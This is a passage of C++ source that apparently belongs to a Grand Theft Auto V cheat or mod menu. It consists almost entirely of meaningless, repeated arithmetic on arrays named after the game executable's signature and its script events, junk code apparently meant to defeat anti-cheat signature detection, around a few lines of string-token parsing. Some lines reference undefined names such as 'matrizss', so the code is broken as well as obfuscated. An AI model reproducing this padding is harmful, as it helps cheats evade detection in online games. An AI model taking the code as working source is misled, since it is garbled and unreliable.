						a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
						a = 0.0f;
						a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
						b = 0.0f;
						GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
						GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
						GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
						GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
						GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
						GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
						GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
							TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
							a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
						}
						else
						{
							offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
							offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
							offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
							offset = (0xB1231 * 0xA) + 0xA12;
							a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						}
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (5) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
						if (TriggerScriptEvent[4] > 50.0f)
						{
							TriggerScriptEvent[4] = TriggerScriptEvent[1];
						}
						a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
						a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
						a = 0.0f;
						a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
						b = 0.0f;
						TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
						TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
						TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						TriggerScriptEvent[4] = TriggerScriptEvent[1];
						TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
						offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
						offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
						TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
						offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						offset = (0xB1231 * 0xA) + 0xA12;
						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

						if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
							TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
							a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
						}
						else
						{
							TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
							TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
							TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
							TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
							a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						}
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
						a = 0.0f;
						b = 0.0f;
						if (TriggerScriptEvent[4] > 50.0f)
						{
							TriggerScriptEvent[4] = TriggerScriptEvent[1];
						}
						a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
						a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
						a = 0.0f;
						a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
						b = 0.0f;
						TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
						TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
						TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
						TriggerScriptEvent[4] = TriggerScriptEvent[1];
						TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
						TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
						TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
						TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						b = Extern_Reader::StringManager::ReplaceWord(b, "<X>", "");
						tokens.push_back(b);
					}
					else if (Extern_Reader::StringManager::SeContemTexto(token, "<Y>"))
					{

					if (offset > aaaaaa)
					{
						matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
						matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
						matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
						matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
						matriz[7] = (0xB1231 * 0xA) + matriz[2];
						a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
					}
					else
					{
						offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
						offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
						offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
						offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
						offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
					}
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
					if (matriz[4] > 50.0f)
					{
						matriz[4] = matriz[1];
					}
					a2 = (matriz[4]) / (2 * matriz[2]);
					a1 = (matriz[3] + (2)) / (2 * matriz[2]);
					offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (matriz[3] + (5)) / (2 * matriz[2]);
					aaaaaa = ponteiro * 2;
					a = 0.0f;
					a1 = (matriz[3] + (4)) / (2 * matriz[2]);
					b = 0.0f;
					matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
					a2 = (matriz[4] + (3)) / (2 * matriz[2]);
					offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
					matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
					matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
					matriz[4] = matriz[1];
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
					offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
					a2 = (matriz[4] + (3)) / (2 * matriz[2]);
					a2 = (matriz[4] + (2)) / (2 * matriz[2]);
					offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					offset = (0xB1231 * 0xA) + 0xA12;
					if (offset > aaaaaa)
					{
					}
					else
						a1 = (matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (matriz[4] - (3)) / (2 * matriz[2]);

					if (matriz[1] > aaaaaa)
					{
						matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
						matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
						matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
						matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
						matriz[7] = (0xB1231 * 0xA) + matriz[2];
						a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
					}
					else
					{
						matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
						matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
						matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
						matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
						matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
					}
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
					a = 0.0f;
					b = 0.0f;
					if (matriz[4] > 50.0f)
					{
						matriz[4] = matriz[1];
					}
					a2 = (matriz[4]) / (2 * matriz[2]);
					a1 = (matriz[3] + (2)) / (2 * matriz[2]);
					matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (matriz[3] + (5)) / (2 * matriz[2]);
					aaaaaa = 0xB2 * 2;
					a = 0.0f;
					a1 = (matriz[3] + (4)) / (2 * matriz[2]);
					b = 0.0f;
					matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
					a2 = (matriz[4] + (3)) / (2 * matriz[2]);
					matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
					matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
					matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
					matriz[4] = matriz[1];
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
					matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
					a2 = (matriz[4] + (3)) / (2 * matriz[2]);
					a2 = (matriz[4] + (2)) / (2 * matriz[2]);
					matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					if (matriz[1] > aaaaaa)
					{
					}
					else
						a1 = (matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (matriz[4] - (3)) / (2 * matriz[2]);

					if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
						GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
						GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
						GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
						GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
						a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
					}
					else
					{
						offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
						offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
						offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
					}
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
					if (GTA5_exe_sig_[4] > 50.0f)
					{
						GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
					}
					a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
					a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
					NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
					a = 0.0f;
					a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					b = 0.0f;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
					GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
					a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
					a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
					offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					offset = (0xB1231 * 0xA) + 0xA12;
					if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
					}
					else
						a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

					if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
						GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
						GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
						a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
					}
					else
					{
						GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
						GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
